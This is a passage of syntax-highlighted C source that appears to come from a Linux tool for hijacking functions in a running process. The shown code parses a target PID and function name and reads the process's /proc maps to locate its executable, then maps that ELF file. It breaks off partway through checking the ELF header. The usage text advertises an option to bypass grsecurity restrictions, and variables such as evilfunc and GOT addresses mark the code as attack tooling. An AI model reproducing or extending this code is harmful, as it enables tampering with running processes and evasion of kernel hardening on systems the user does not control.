&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: #993333;">char</span> *<span style="color: #000000; font-weight: bold;">function</span>, et_dyn = <span style="color: #cc66cc;">0</span>, grsec = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; FILE *fd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> stat st;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> md, status;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr *phdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr text_vaddr, got_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr export, elf_base, dyn_mmap_got_addr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> evilfunc;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> linking_info *lp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> pid;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *libc;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argc &lt; <span style="color: #cc66cc;">3</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usage:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Usage: %s &lt;pid&gt; &lt;function&gt; [opts]<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"-d&nbsp; &nbsp; &nbsp; ET_DYN processes<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"-g&nbsp; &nbsp; &nbsp; bypass grsec binary flag restriction <span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"-2 &nbsp; &nbsp; &nbsp;Meant to be used as a secondary method of<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"finding sysenter with -g; if -g fails, then add -2<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"Example 1: %s &lt;pid&gt; &lt;function&gt; -g<span style="color: #000099; font-weight: bold;">\n</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">"Example 2: %s &lt;pid&gt; &lt;function&gt; -g -2<span style="color: #000099; font-weight: bold;">\n</span>"</span>, argv<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>,argv<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>,argv<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; i = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">[</span>i<span style="color: black;">]</span> &gt;= <span style="color: #ff0000;">'0'</span> &amp;&amp; argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">[</span>i<span style="color: black;">]</span> &lt;= <span style="color: #ff0000;">'9'</span><span style="color: black;">)</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i++;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>i != strlen<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> usage;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argc &gt; <span style="color: #cc66cc;">3</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'-'</span> &amp;&amp; argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'d'</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; et_dyn = <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'-'</span> &amp;&amp; argv<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == <span style="color: #ff0000;">'g'</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; grsec = <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> &amp;&amp; !strcmp<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span>, <span style="color: #ff0000;">"-2"</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; static_sysenter = <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Unrecognized option: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, argv<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> usage;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; pid = atoi<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">function</span> = strdup<span style="color: black;">(</span>argv<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"strdup"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;snprintf<span style="color: black;">(</span>meminfo, <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>meminfo<span style="color: black;">)</span><span style="color: #cc66cc;">-1</span>, <span style="color: #ff0000;">"/proc/%d/maps"</span>, pid<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>fd = fopen<span style="color: black;">(</span>meminfo, <span style="color: #ff0000;">"r"</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"PID: %i cannot be checked, /proc/%i/maps does not exist<span style="color: #000099; font-weight: bold;">\n</span>"</span>, pid, pid<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* ET_DYN */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>et_dyn<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>fgets<span style="color: black;">(</span>buf, MAXBUF<span style="color: #cc66cc;">-1</span>, fd<span style="color: black;">)</span><span style="color: black;">)</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span> &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strstr<span style="color: black;">(</span>buf, <span style="color: #ff0000;">"r-xp"</span><span style="color: black;">)</span> &amp;&amp; !strstr<span style="color: black;">(</span>buf, <span style="color: #ff0000;">".so"</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>tmp, buf, MAXBUF<span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>p = strchr<span style="color: black;">(</span>buf, <span style="color: #ff0000;">'-'</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *p
 = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\0</span>'</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text_base = strtoul<span style="color: black;">(</span>buf, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #cc66cc;">16</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strchr<span style="color: black;">(</span>tmp, <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
fclose<span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"error parsing pid map<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>file = strdup<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>&amp;tmp<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
perror<span style="color: black;">(</span><span style="color: #ff0000;">"strdup"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i = <span style="color: #cc66cc;">0</span>;&nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>file<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\0</span>'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> next;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* ET_EXEC */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; fgets<span style="color: black;">(</span>buf, MAXBUF<span style="color: #cc66cc;">-1</span>, fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>tmp, buf, MAXBUF<span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strchr<span style="color: black;">(</span>tmp, <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'/'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose <span style="color: black;">(</span>fd<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"error parsing pid map<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>file = strdup<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>&amp;tmp<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span><span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"strdup"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; i = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>file<span style="color: black;">[</span>i++<span style="color: black;">]</span> != <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; file<span style="color: black;">[</span>i - <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\0</span>'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; next: <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>md = open<span style="color: black;">(</span>file, O_RDONLY<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"open"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>fstat<span style="color: black;">(</span>md, &amp;st<span style="color: black;">)</span> &lt; <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"fstat"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; mem = mmap<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, st.<span style="color: #202020;">st_size</span>, PROT_READ, MAP_PRIVATE, md, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>mem == MAP_FAILED<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"mmap"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ehdr-&gt;e_ident<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> != 0x7f &amp;&amp; strcmp<span style="color: black;">(</span>&amp;ehdr-&gt;e_ident<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span>, <span style="color: #ff0000;">"ELF"</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
